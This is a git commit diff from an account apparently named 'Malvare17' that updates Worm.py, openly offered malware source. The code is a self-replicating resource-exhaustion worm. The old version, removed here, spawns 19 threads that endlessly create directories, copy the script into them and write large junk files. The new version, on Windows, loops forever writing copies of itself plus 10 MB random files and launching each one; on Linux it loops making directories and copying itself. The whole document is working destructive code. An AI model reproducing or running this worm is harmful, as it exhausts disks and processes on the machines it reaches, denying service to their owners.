8734966cf3c4da2d7c3cb9e182c864c7f65f7bdc
Free Malvare <64208836+Malvare17@users.noreply.github.com>
2020-04-27 21:33:51 +0200

    Update Worm.py

--- Worm.py
+++ Worm.py
@@ -1,9 +1,4 @@
-import sys
-import os
-import random
-import string
-import subprocess
-import threading
+import sys, os, random, string, subprocess, threading
 
 SCRIPT = sys.argv
 NAME = str(SCRIPT[0])
@@ -12,91 +7,42 @@ def RANDOM_(Length):
 	Letters_ = string.ascii_lowercase
 	return ''.join(random.choice(Letters_) for i in range(Length))
 
-def NEW_():
-	FILE_NAME_1 = RANDOM_(32)
-	FILE_NAME_2 = RANDOM_(32)
-	FILE_NAME_3 = RANDOM_(32)
-	FILE_NAME_4 = RANDOM_(32)
-	FileName = FILE_NAME_1 + FILE_NAME_2 + FILE_NAME_3 + FILE_NAME_4
+def WIN32_():
+	I = open(__file__).read()
+	import random,subprocess,os
+	NAME = str(random.randint(1,1000000))
+	with open(NAME+'.py','w') as f:
+		f.write(I)
+	with open(NAME,'wb') as big_file:
+		big_file.write(os.urandom(10240000))
+	my_file = '{}.py'.format(NAME)
+	process = subprocess.Popen(["python", my_file], shell =False)
 
-	File_ = open(FileName, "w+")
+def LINUX_():
+	DIR_NAME_1 = RANDOM_(32)
+	DIR_NAME_2 = RANDOM_(32)
+	DIR_NAME_3 = RANDOM_(32)
+	DIR_NAME_4 = RANDOM_(32)
 
-	TEXT_1 = RANDOM_(32)
-	TEXT_2 = RANDOM_(32)
-	TEXT_3 = RANDOM_(32)
-	TEXT_4 = RANDOM_(32)
-	TEXT_5 = RANDOM_(32)
-	TEXT_6 = RANDOM_(32)
+	DirectoryName = DIR_NAME_1 + DIR_NAME_2 + DIR_NAME_3 + DIR_NAME_4
+	subprocess.call(['mkdir', DirectoryName])
+	subprocess.call(['cp', NAME, DirectoryName])
 
-	TEXT_CONTENT = TEXT_1 + TEXT_2 + TEXT_3 + TEXT_4 + TEXT_5 + TEXT_6
-
-	for i in range(1000000):
-		File_.write(TEXT_CONTENT + "asd%d\r\n")
-
-	File_.close()
-
-class Pink(threading.Thread):
+class THREAD_(threading.Thread):
 	def __init__(self):
 		threading.Thread.__init__(self)
 
-
-
 	def run(self):
-		Bool = False
-		while True:
-			if Bool == False:								
-				subprocess.call(['mkdir', 'logs'])
-				Bool = True
+		if sys.platform == "win32":
+			while True:
+				WIN32_()
 
-			else:
+		elif sys.platform == "linux2":
+			while True:
+				LINUX_()
 
-				DIR_NAME_P1 = RANDOM_(32)
-				DIR_NAME_P2 = RANDOM_(32)
-				DIR_NAME_P3 = RANDOM_(32)
-				DIR_NAME_P4 = RANDOM_(32)
 
-				DirectoryName = DIR_NAME_P1+ DIR_NAME_P2 + DIR_NAME_P3 + DIR_NAME_P4
-				subprocess.call(['mkdir', DirectoryName])
-				subprocess.call(['cp', NAME, DirectoryName])
+print("Author: Malvare17 | https://github.com/Malvare17")
 
-				NEW_()
-
-ThreadA = Pink()
-ThreadB = Pink()
-ThreadC = Pink()
-ThreadD = Pink()
-ThreadE = Pink()
-ThreadF = Pink()
-ThreadG = Pink()
-ThreadH = Pink()
-ThreadJ = Pink()
-ThreadK = Pink()
-ThreadL = Pink()
-ThreadM = Pink()
-ThreadN = Pink()
-ThreadO = Pink()
-ThreadP = Pink()
-ThreadR = Pink()
-ThreadS = Pink()
-ThreadT = Pink()
-ThreadU = Pink()
-
+ThreadA = THREAD_()
 ThreadA.start()
-ThreadB.start()
-ThreadC.start()
-ThreadD.start()
-ThreadE.start()
-ThreadF.start()
-ThreadG.start()
-ThreadH.start()
-ThreadJ.start()
-ThreadK.start()
-ThreadL.start()
-ThreadM.start()
-ThreadN.start()
-ThreadO.start()
-ThreadP.start()
-ThreadR.start()
-ThreadS.start()
-ThreadT.start()
-ThreadU.start()
